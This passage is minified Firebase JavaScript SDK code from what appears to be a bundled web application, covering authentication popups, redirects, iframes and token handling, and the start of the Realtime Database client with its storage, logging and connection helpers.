Date.now()-this.lastProcessedEventTime>=uk&&this.cachedEventUids.clear(),this.cachedEventUids.has(Rp(e))}saveEventToCache(e){this.cachedEventUids.add(Rp(e)),this.lastProcessedEventTime=Date.now()}}function Rp(t){return[t.type,t.eventId,t.sessionId,t.tenantId].filter(e=>e).join("-")}function $v({type:t,error:e}){return t==="unknown"&&(e==null?void 0:e.code)==="auth/no-auth-event"}function dk(t){switch(t.type){case"signInViaRedirect":case"linkViaRedirect":case"reauthViaRedirect":return!0;case"unknown":return $v(t);default:return!1}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */async function hk(t,e={}){return vr(t,"GET","/v1/projects",e)}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const fk=/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/,pk=/^https?/;async function mk(t){if(t.config.emulator)return;const{authorizedDomains:e}=await hk(t);for(const n of e)try{if(gk(n))return}catch{}wt(t,"unauthorized-domain")}function gk(t){const e=Cc(),{protocol:n,hostname:r}=new URL(e);if(t.startsWith("chrome-extension://")){const o=new URL(t);return o.hostname===""&&r===""?n==="chrome-extension:"&&t.replace("chrome-extension://","")===e.replace("chrome-extension://",""):n==="chrome-extension:"&&o.hostname===r}if(!pk.test(n))return!1;if(fk.test(t))return r===t;const i=t.replace(/\./g,"\\.");return new RegExp("^(.+\\."+i+"|"+i+")$","i").test(r)}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const _k=new Gs(3e4,6e4);function Np(){const t=Pt().___jsl;if(t!=null&&t.H){for(const e of Object.keys(t.H))if(t.H[e].r=t.H[e].r||[],t.H[e].L=t.H[e].L||[],t.H[e].r=[...t.H[e].L],t.CP)for(let n=0;n<t.CP.length;n++)t.CP[n]=null}}function vk(t){return new Promise((e,n)=>{var r,i,s;function o(){Np(),gapi.load("gapi.iframes",{callback:()=>{e(gapi.iframes.getContext())},ontimeout:()=>{Np(),n(Nt(t,"network-request-failed"))},timeout:_k.get()})}if(!((i=(r=Pt().gapi)===null||r===void 0?void 0:r.iframes)===null||i===void 0)&&i.Iframe)e(gapi.iframes.getContext());else if(!((s=Pt().gapi)===null||s===void 0)&&s.load)o();else{const l=dI("iframefcb");return Pt()[l]=()=>{gapi.load?o():n(Nt(t,"network-request-failed"))},Pv(`https://apis.google.com/js/api.js?onload=${l}`).catch(a=>n(a))}}).catch(e=>{throw $o=null,e})}let $o=null;function yk(t){return $o=$o||vk(t),$o}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const wk=new Gs(5e3,15e3),Ek="__/auth/iframe",Ck="emulator/auth/iframe",Sk={style:{position:"absolute",top:"-100px",width:"1px",height:"1px"},"aria-hidden":"true",tabindex:"-1"},Tk=new Map([["identitytoolkit.googleapis.com","p"],["staging-identitytoolkit.sandbox.googleapis.com","s"],["test-identitytoolkit.sandbox.googleapis.com","t"]]);function Ik(t){const e=t.config;O(e.authDomain,t,"auth-domain-config-required");const n=e.emulator?Yd(e,Ck):`https://${t.config.authDomain}/${Ek}`,r={apiKey:e.apiKey,appName:t.name,v:gr},i=Tk.get(t.config.apiHost);i&&(r.eid=i);const s=t._getFrameworks();return s.length&&(r.fw=s.join(",")),`${n}?${_i(r).slice(1)}`}async function kk(t){const e=await yk(t),n=Pt().gapi;return O(n,t,"internal-error"),e.open({where:document.body,url:Ik(t),messageHandlersFilter:n.iframes.CROSS_ORIGIN_IFRAMES_FILTER,attributes:Sk,dontclear:!0},r=>new Promise(async(i,s)=>{await r.restyle({setHideOnLeave:!1});const o=Nt(t,"network-request-failed"),l=Pt().setTimeout(()=>{s(o)},wk.get());function a(){Pt().clearTimeout(l),i(r)}r.ping(a).then(a,()=>{s(o)})}))}/**
 * @license
 * Copyright 2020 Google LLC.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Rk={location:"yes",resizable:"yes",statusbar:"yes",toolbar:"no"},Nk=500,Pk=600,xk="_blank",Ak="http://localhost";class Pp{constructor(e){this.window=e,this.associatedEvent=null}close(){if(this.window)try{this.window.close()}catch{}}}function Ok(t,e,n,r=Nk,i=Pk){const s=Math.max((window.screen.availHeight-i)/2,0).toString(),o=Math.max((window.screen.availWidth-r)/2,0).toString();let l="";const a=Object.assign(Object.assign({},Rk),{width:r.toString(),height:i.toString(),top:s,left:o}),u=Ae().toLowerCase();n&&(l=Cv(u)?xk:n),Ev(u)&&(e=e||Ak,a.scrollbars="yes");const c=Object.entries(a).reduce((h,[m,_])=>`${h}${m}=${_},`,"");if(nI(u)&&l!=="_self")return bk(e||"",l),new Pp(null);const d=window.open(e||"",l,c);O(d,t,"popup-blocked");try{d.focus()}catch{}return new Pp(d)}function bk(t,e){const n=document.createElement("a");n.href=t,n.target=e;const r=document.createEvent("MouseEvent");r.initMouseEvent("click",!0,!0,window,1,0,0,0,0,!1,!1,!1,!1,1,null),n.dispatchEvent(r)}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Lk="__/auth/handler",Dk="emulator/auth/handler",Mk=encodeURIComponent("fac");async function xp(t,e,n,r,i,s){O(t.config.authDomain,t,"auth-domain-config-required"),O(t.config.apiKey,t,"invalid-api-key");const o={apiKey:t.config.apiKey,appName:t.name,authType:n,redirectUrl:r,v:gr,eventId:i};if(e instanceof Av){e.setDefaultLanguage(t.languageCode),o.providerId=e.providerId||"",gc(e.getCustomParameters())||(o.customParameters=JSON.stringify(e.getCustomParameters()));for(const[c,d]of Object.entries(s||{}))o[c]=d}if(e instanceof Ys){const c=e.getScopes().filter(d=>d!=="");c.length>0&&(o.scopes=c.join(","))}t.tenantId&&(o.tid=t.tenantId);const l=o;for(const c of Object.keys(l))l[c]===void 0&&delete l[c];const a=await t._getAppCheckToken(),u=a?`#${Mk}=${encodeURIComponent(a)}`:"";return`${Uk(t)}?${_i(l).slice(1)}${u}`}function Uk({config:t}){return t.emulator?Yd(t,Dk):`https://${t.authDomain}/${Lk}`}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const uu="webStorageSupport";class Fk{constructor(){this.eventManagers={},this.iframes={},this.originValidationPromises={},this._redirectPersistence=Fv,this._completeRedirectFn=ak,this._overrideRedirectResult=sk}async _openPopup(e,n,r,i){var s;Vt((s=this.eventManagers[e._key()])===null||s===void 0?void 0:s.manager,"_initialize() not called before _openPopup()");const o=await xp(e,n,r,Cc(),i);return Ok(e,o,eh())}async _openRedirect(e,n,r,i){await this._originValidation(e);const s=await xp(e,n,r,Cc(),i);return BI(s),new Promise(()=>{})}_initialize(e){const n=e._key();if(this.eventManagers[n]){const{manager:i,promise:s}=this.eventManagers[n];return i?Promise.resolve(i):(Vt(s,"If manager is not set, promise should be"),s)}const r=this.initAndGetManager(e);return this.eventManagers[n]={promise:r},r.catch(()=>{delete this.eventManagers[n]}),r}async initAndGetManager(e){const n=await kk(e),r=new ck(e);return n.register("authEvent",i=>(O(i==null?void 0:i.authEvent,e,"invalid-auth-event"),{status:r.onEvent(i.authEvent)?"ACK":"ERROR"}),gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER),this.eventManagers[e._key()]={manager:r},this.iframes[e._key()]=n,r}_isIframeWebStorageSupported(e,n){this.iframes[e._key()].send(uu,{type:uu},i=>{var s;const o=(s=i==null?void 0:i[0])===null||s===void 0?void 0:s[uu];o!==void 0&&n(!!o),wt(e,"internal-error")},gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER)}_originValidation(e){const n=e._key();return this.originValidationPromises[n]||(this.originValidationPromises[n]=mk(e)),this.originValidationPromises[n]}get _shouldInitProactively(){return Rv()||Xd()||fa()}}const jk=Fk;var Ap="@firebase/auth",Op="1.3.0";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class zk{constructor(e){this.auth=e,this.internalListeners=new Map}getUid(){var e;return this.assertAuthConfigured(),((e=this.auth.currentUser)===null||e===void 0?void 0:e.uid)||null}async getToken(e){return this.assertAuthConfigured(),await this.auth._initializationPromise,this.auth.currentUser?{accessToken:await this.auth.currentUser.getIdToken(e)}:null}addAuthTokenListener(e){if(this.assertAuthConfigured(),this.internalListeners.has(e))return;const n=this.auth.onIdTokenChanged(r=>{e((r==null?void 0:r.stsTokenManager.accessToken)||null)});this.internalListeners.set(e,n),this.updateProactiveRefresh()}removeAuthTokenListener(e){this.assertAuthConfigured();const n=this.internalListeners.get(e);n&&(this.internalListeners.delete(e),n(),this.updateProactiveRefresh())}assertAuthConfigured(){O(this.auth._initializationPromise,"dependent-sdk-initialized-before-auth")}updateProactiveRefresh(){this.internalListeners.size>0?this.auth._startProactiveRefresh():this.auth._stopProactiveRefresh()}}/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Bk(t){switch(t){case"Node":return"node";case"ReactNative":return"rn";case"Worker":return"webworker";case"Cordova":return"cordova";default:return}}function Hk(t){sr(new Rn("auth",(e,{options:n})=>{const r=e.getProvider("app").getImmediate(),i=e.getProvider("heartbeat"),s=e.getProvider("app-check-internal"),{apiKey:o,authDomain:l}=r.options;O(o&&!o.includes(":"),"invalid-api-key",{appName:r.name});const a={apiKey:o,authDomain:l,clientPlatform:t,apiHost:"identitytoolkit.googleapis.com",tokenApiHost:"securetoken.googleapis.com",apiScheme:"https",sdkClientVersion:Nv(t)},u=new uI(r,i,s,a);return _I(u,n),u},"PUBLIC").setInstantiationMode("EXPLICIT").setInstanceCreatedCallback((e,n,r)=>{e.getProvider("auth-internal").initialize()})),sr(new Rn("auth-internal",e=>{const n=yr(e.getProvider("auth").getImmediate());return(r=>new zk(r))(n)},"PRIVATE").setInstantiationMode("EXPLICIT")),Rt(Ap,Op,Bk(t)),Rt(Ap,Op,"esm2017")}/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Wk=5*60,$k=iv("authIdTokenMaxAge")||Wk;let bp=null;const Vk=t=>async e=>{const n=e&&await e.getIdTokenResult(),r=n&&(new Date().getTime()-Date.parse(n.issuedAtTime))/1e3;if(r&&r>$k)return;const i=n==null?void 0:n.token;bp!==i&&(bp=i,await fetch(t,{method:i?"POST":"DELETE",headers:i?{Authorization:`Bearer ${i}`}:{}}))};function qk(t=qd()){const e=ha(t,"auth");if(e.isInitialized())return e.getImmediate();const n=gI(t,{popupRedirectResolver:jk,persistence:[QI,FI,Fv]}),r=iv("authTokenSyncURL");if(r){const s=Vk(r);bI(n,s,()=>s(n.currentUser)),OI(n,o=>s(o))}const i=tv("auth");return i&&vI(n,`http://${i}`),n}Hk("Browser");const Vv=(t,e,n)=>{I.useEffect(()=>{const r=LI(t,i=>{(!i||i.uid&&i.uid!==e)&&n("/")});return()=>r()},[t,e,n])};var Gk="firebase",Kk="10.5.0";/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */Rt(Gk,Kk,"app");const Lp="@firebase/database",Dp="1.0.1";/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let qv="";function Yk(t){qv=t}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Qk{constructor(e){this.domStorage_=e,this.prefix_="firebase:"}set(e,n){n==null?this.domStorage_.removeItem(this.prefixedName_(e)):this.domStorage_.setItem(this.prefixedName_(e),ye(n))}get(e){const n=this.domStorage_.getItem(this.prefixedName_(e));return n==null?null:Is(n)}remove(e){this.domStorage_.removeItem(this.prefixedName_(e))}prefixedName_(e){return this.prefix_+e}toString(){return this.domStorage_.toString()}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class Xk{constructor(){this.cache_={},this.isInMemoryStorage=!0}set(e,n){n==null?delete this.cache_[e]:this.cache_[e]=n}get(e){return Qt(this.cache_,e)?this.cache_[e]:null}remove(e){delete this.cache_[e]}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Gv=function(t){try{if(typeof window<"u"&&typeof window[t]<"u"){const e=window[t];return e.setItem("firebase:sentinel","cache"),e.removeItem("firebase:sentinel"),new Qk(e)}}catch{}return new Xk},$n=Gv("localStorage"),Tc=Gv("sessionStorage");/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const Kr=new $d("@firebase/database"),Jk=function(){let t=1;return function(){return t++}}(),Kv=function(t){const e=PS(t),n=new IS;n.update(e);const r=n.digest();return Bd.encodeByteArray(r)},Xs=function(...t){let e="";for(let n=0;n<t.length;n++){const r=t[n];Array.isArray(r)||r&&typeof r=="object"&&typeof r.length=="number"?e+=Xs.apply(null,r):typeof r=="object"?e+=ye(r):e+=r,e+=" "}return e};let Qn=null,Mp=!0;const Zk=function(t,e){S(!e||t===!0||t===!1,"Can't turn on custom loggers persistently."),t===!0?(Kr.logLevel=V.VERBOSE,Qn=Kr.log.bind(Kr),e&&Tc.set("logging_enabled",!0)):typeof t=="function"?Qn=t:(Qn=null,Tc.remove("logging_enabled"))},Pe=function(...t){if(Mp===!0&&(Mp=!1,Qn===null&&Tc.get("logging_enabled")===!0&&Zk(!0)),Qn){const e=Xs.apply(null,t);Qn(e)}},Js=function(t){return function(...e){Pe(t,...e)}},Ic=function(...t){const e="FIREBASE INTERNAL ERROR: "+Xs(...t);Kr.error(e)},qt=function(...t){const e=`FIREBASE FATAL ERROR: ${Xs(...t)}`;throw Kr.error(e),new Error(e)},qe=function(...t){const e="FIREBASE WARNING: "+Xs(...t);Kr.warn(e)},eR=function(){typeof window<"u"&&window.location&&window.location.protocol&&window.location.protocol.indexOf("https:")!==-1&&qe("Insecure Firebase access from a secure page. Please use https in calls to new Firebase().")},Yv=function(t){return typeof t=="number"&&(t!==t||t===Number.POSITIVE_INFINITY||t===Number.NEGATIVE_INFINITY)},tR=function(t){if(document.readyState==="complete")t();else{let e=!1;const n=function(){if(!document.body){setTimeout(n,Math.floor(10));return}e||(e=!0,t())};document.addEventListener?(document.addEventListener("DOMContentLoaded",n,!1),window.addEventListener("load",n,!1)):document.attachEvent&&(document.attachEvent("onreadystatechange",()=>{document.readyState==="complete"&&n()}),window.attachEvent("onload",n))}},ai="[MIN_NAME]",ar="[MAX_NAME]",yi=function(t,e){if(t===e)return 0;if(t===ai||e===ar)return-1;if(e===ai||t===ar)return 1;{const n=Up(t),r=Up(e);return n!==null?r!==null?n-r===0?t.length-e.length:n-r:-1:r!==null?1:t<e?-1:1}},nR=function(t,e){return t===e?0:t<e?-1:1},bi=function(t,e){if(e&&t in e)return e[t];throw new Error("Missing required key ("+t+") in object: "+ye(e))},nh=function(t){if(typeof t!="object"||t===null)return ye(t);const e=[];for(const r in t)e.push(r);e.sort();let n="{";for(let r=0;r<e.length;r++)r!==0&&(n+=","),n+=ye(e[r]),n+=":",n+=nh(t[e[r]]);return n+="}",n},Qv=function(t,e){const n=t.length;if(n<=e)return[t];const r=[];for(let i=0;i<n;i+=e)i+e>n?r.push(t.substring(i,n)):r.push(t.substring(i,i+e));return r};function Ge(t,e){for(const n in t)t.hasOwnProperty(n)&&e(n,t[n])}const Xv=function(t){S(!Yv(t),"Invalid JSON number");const e=11,n=52,r=(1<<e-1)-1;let i,s,o,l,a;t===0?(s=0,o=0,i=1/t===-1/0?1:0):(i=t<0,t=Math.abs(t),t>=Math.pow(2,1-r)?(l=Math.min(Math.floor(Math.log(t)/Math.LN2),r),s=l+r,o=Math.round(t*Math.pow(2,n-l)-Math.pow(2,n))):(s=0,o=Math.round(t/Math.pow(2,1-r-n))));const u=[];for(a=n;a;a-=1)u.push(o%2?1:0),o=Math.floor(o/2);for(a=e;a;a-=1)u.push(s%2?1:0),s=Math.floor(s/2);u.push(i?1:0),u.reverse();const c=u.join("");let d="";for(a=0;a<64;a+=8){let h=parseInt(c.substr(a,8),2).toString(16);h.length===1&&(h="0"+h),d=d+h}return d.toLowerCase()},rR=function(){return!!(typeof window=="object"&&window.chrome&&window.chrome.extension&&!/^chrome/.test(window.location.href))},iR=function(){return typeof Windows=="object"&&typeof Windows.UI=="object"};function sR(t,e){let n="Unknown Error";t==="too_big"?n="The data requested exceeds the maximum size that can be accessed with a single request.":t==="permission_denied"?n="Client doesn't have permission to access the desired data.":t==="unavailable"&&(n="The service is unavailable");const r=new Error(t+" at "+e._path.toString()+": "+n);return r.code=t.toUpperCase(),r}const oR=new RegExp("^-?(0*)\\d{1,10}$"),lR=-2147483648,aR=2147483647,Up=function(t){if(oR.test(t)){const e=Number(t);if(e>=lR&&e<=aR)return e}return null},wi=function(t){try{t()}catch(e){setTimeout(()=>{const n=e.stack||"";throw qe("Exception was thrown by user callback.",n),e},Math.floor(0))}},uR=function(){return(typeof window=="object"&&window.navigator&&window.navigator.userAgent||"").search(/googlebot|google webmaster tools|bingbot|yahoo! slurp|baiduspider|yandexbot|duckduckbot/i)>=0},ns=function(t,e){const n=setTimeout(t,e);return typeof n=="number"&&typeof Deno<"u"&&Deno.unrefTimer?Deno.unrefTimer(n):typeof n=="object"&&n.unref&&n.unref(),n};/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class cR{constructor(e,n){this.appName_=e,this.appCheckProvider=n,this.appCheck=n==null?void 0:n.getImmediate({optional:!0}),this.appCheck||n==null||n.get().then(r=>this.appCheck=r)}getToken(e){return this.appCheck?this.appCheck.getToken(e):new Promise((n,r)=>{setTimeout(()=>{this.appCheck?this.getToken(e).then(n,r):n(null)},0)})}addTokenChangeListener(e){var n;(n=this.appCheckProvider)===null||n===void 0||n.get().then(r=>r.addTokenListener(e))}notifyForInvalidToken(){qe(`Provided AppCheck credentials for the app named "${this.appName_}" are invalid. This usually indicates your app was not initialized correctly.`)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class dR{constructor(e,n,r){this.appName_=e,this.firebaseOptions_=n,this.authProvider_=r,this.auth_=null,this.auth_=r.getImmediate({optional:!0}),this.auth_||r.onInit(i=>this.auth_=i)}getToken(e){return this.auth_?this.auth_.getToken(e).catch(n=>n&&n.code==="auth/token-not-initialized"?(Pe("Got auth/token-not-initialized error.  Treating as null token."),null):Promise.reject(n)):new Promise((n,r)=>{setTimeout(()=>{this.auth_?this.getToken(e).then(n,r):n(null)},0)})}addTokenChangeListener(e){this.auth_?this.auth_.addAuthTokenListener(e):this.authProvider_.get().then(n=>n.addAuthTokenListener(e))}removeTokenChangeListener(e){this.authProvider_.get().then(n=>n.removeAuthTokenListener(e))}notifyForInvalidToken(){let e='Provided authentication credentials for the app named "'+this.appName_+'" are invalid. This usually indicates your app was not initialized correctly. ';"credential"in this.firebaseOptions_?e+='Make sure the "credential" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':"serviceAccount"in this.firebaseOptions_?e+='Make sure the "serviceAccount" property provided to initializeApp() is authorized to access the specified "databaseURL" and is from the correct project.':e+='Make sure the "apiKey" and "databaseURL" properties provided to initializeApp() match the values provided for your app at https://console.firebase.google.com/.',qe(e)}}class Yr{constructor(e){this.accessToken=e}getToken(e){return Promise.resolve({accessToken:this.accessToken})}addTokenChangeListener(e){e(this.accessToken)}removeTokenChangeListener(e){}notifyForInvalidToken(){}}Yr.OWNER="owner";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const rh="5",Jv="v",Zv="s",ey="r",ty="f",ny=/(console\.firebase|firebase-console-\w+\.corp|firebase\.corp)\.google\.com/,ry="ls",iy="p",kc="ac",sy="websocket",oy="long_polling";/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class ly{constructor(e,n,r,i,s=!1,o="",l=!1,a=!1){this.secure=n,this.namespace=r,this.webSocketOnly=i,this.nodeAdmin=s,this.persistenceKey=o,this.includeNamespaceInQueryParams=l,this.isUsingEmulator=a,this._host=e.toLowerCase(),this._domain=this._host.substr(this._host.indexOf(".")+1),this.internalHost=$n.get("host:"+e)||this._host}isCacheableHost(){return this.internalHost.substr(0,2)==="s-"}isCustomHost(){return this._domain!=="firebaseio.com"&&this._domain!=="firebaseio-demo.com"}get host(){return this._host}set host(e){e!==this.internalHost&&(this.internalHost=e,this.isCacheableHost()&&$n.set("host:"+this._host,this.internalHost))}toString(){let e=this.toURLString();return this.persistenceKey&&(e+="<"+this.persistenceKey+">"),e}toURLString(){const e=this.secure?"https://":"http://",n=this.includeNamespaceInQueryParams?`?ns=${this.namespace}`:"";return`${e}${this.host}/${n}`}}function hR(t){return t.host!==t.internalHost||t.isCustomHost()||t.includeNamespaceInQueryParams}function ay(t,e,n){S(typeof e=="string","typeof type must == string"),S(typeof n=="object","typeof params must == object");let r;if(e===sy)r=(t.secure?"wss://":"ws://")+t.internalHost+"/.ws?";else if(e===oy)r=(t.secure?"https://":"http://")+t.internalHost+"/.lp?";else throw new Error("Unknown connection type: "+e);hR(t)&&(n.ns=t.namespace);const i=[];return Ge(n,(s,o)=>{i.push(s+"="+o)}),r+i.join("&")}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class fR{constructor(){this.counters_={}}incrementCounter(e,n=1){Qt(this.counters_,e)||(this.counters_[e]=0),this.counters_[e]+=n}get(){return uS(this.counters_)}}/**
 * @license
 * Copyright 2017 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
